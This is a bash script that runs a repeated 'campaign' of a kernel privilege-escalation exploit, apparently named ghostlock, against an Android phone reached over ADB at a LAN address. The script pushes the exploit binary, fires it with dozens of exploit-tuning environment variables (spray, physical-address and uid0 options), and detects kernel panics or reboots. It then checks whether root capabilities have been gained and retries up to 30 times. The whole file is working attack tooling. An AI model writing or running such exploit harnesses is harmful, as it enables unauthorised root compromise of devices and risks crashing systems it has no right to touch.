#!/bin/bash
# Weekend campaign: fire until caps land or 30 attempts
ADB=./adb_local.exe
DEV=192.168.1.2:5555
cd "$(dirname "$0")" 2>/dev/null || cd "/c/Users/LENOVO/Desktop/HILY installer/Oppo/ghostlock-oneplus"
RESULTS=/tmp/campaign46_results.txt
echo "campaign start $(date)" > $RESULTS

fire_once() {
  local n=$1
  # wait for boot + settle
  local UP=""
  for w in $(seq 1 40); do
    $ADB connect $DEV >/dev/null 2>&1
    UP=$($ADB -s $DEV shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
    [ -n "$UP" ] && [ "$UP" -ge 120 ] 2>/dev/null && break
    sleep 15
  done
  [ -z "$UP" ] && { echo "attempt$n: DEVICE_UNREACHABLE" >> $RESULTS; return 2; }

  # ensure binary exists (journal rollback protection)
  $ADB -s $DEV shell "test -x /data/local/tmp/gl_jc3c" >/dev/null 2>&1 || {
    MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*" $ADB -s $DEV push ghostlock-cph2521-jc3c /data/local/tmp/gl_jc3c >/dev/null 2>&1
    $ADB -s $DEV shell "chmod 755 /data/local/tmp/gl_jc3c; sync" >/dev/null 2>&1
  }

  local L="c46_${n}_$(date +%H%M%S)"
  $ADB -s $DEV shell "cd /data/local/tmp; nohup sh -c 'timeout 300 env MODE4_ONLY=1 MODE4_SLIDE_SWAP=1 WRITE_PROOF_TARGET=fops WRITE_PROOF_SHAPE=left MODE4_JC2=1 MODE4_JC2_MAIN=1 MODE4_JC2_QUIET_ENTRY=1 MODE4_JC2_MIDSTAMP_UNLOCK=1 MODE4_GHOST_PRIO=1 MODE4_OWNER_TASK=1 MODE4_W0TASK_FAKE=1 MODE4_CAPSONLY=1 MODE4_CAPS_CHILD=1 PSELECT_SHIFT=0 SPRAY_ALIAS_MAX=0 FOPS_MAX_ATTEMPTS=24 KPHYS=0xa8000000 UID0_NO_SYNCLOG=1 /data/local/tmp/gl_jc3c' > /data/local/tmp/$L.txt 2>&1 &" >/dev/null 2>&1
  echo "attempt$n: FIRED up=$UP log=$L" >> $RESULTS

  sleep 170

  # outcome check
  local UP2=""
  for w in $(seq 1 12); do
    $ADB connect $DEV >/dev/null 2>&1
    UP2=$($ADB -s $DEV shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
    [ -n "$UP2" ] && break
    sleep 15
  done
  if [ -z "$UP2" ]; then
    echo "attempt$n: KP(device_offline)" >> $RESULTS
    return 1
  fi
  if [ "$UP2" -lt "$UP" ] 2>/dev/null; then
    echo "attempt$n: KP(rebooted old=$UP new=$UP2)" >> $RESULTS
    return 1
  fi
  # survived — check caps + walk result
  local CAPS=$($ADB -s $DEV shell "cat /proc/self/status" 2>/dev/null | tr -d '\r' | grep CapEff | head -1)
  local POST=$($ADB -s $DEV shell "toybox grep -a 'post-select' /data/local/tmp/$L.txt 2>/dev/null" | tr -d '\r' | head -1)
  local CHILD=$($ADB -s $DEV shell "ps -A" 2>/dev/null | tr -d '\r' | grep gl_uid0_child | head -1)
  echo "attempt$n: SURVIVED up=$UP2 caps=[$CAPS] post=[$POST] child=[$CHILD]" >> $RESULTS
  if echo "$CAPS" | grep -qv "0000000000000000"; then
    echo "attempt$n: *** CAPS LANDED ***" >> $RESULTS
    return 0
  fi
  return 1
}

for n in $(seq 1 30); do
  fire_once $n
  rc=$?
  [ $rc -eq 0 ] && { echo "*** SUCCESS at attempt $n ***" >> $RESULTS; break; }
  [ $rc -eq 2 ] && { echo "device gone, stopping" >> $RESULTS; break; }
  # reboot for next attempt (skip if already rebooted by KP — just wait)
  sleep 20
done
echo "campaign end $(date)" >> $RESULTS
cat $RESULTS
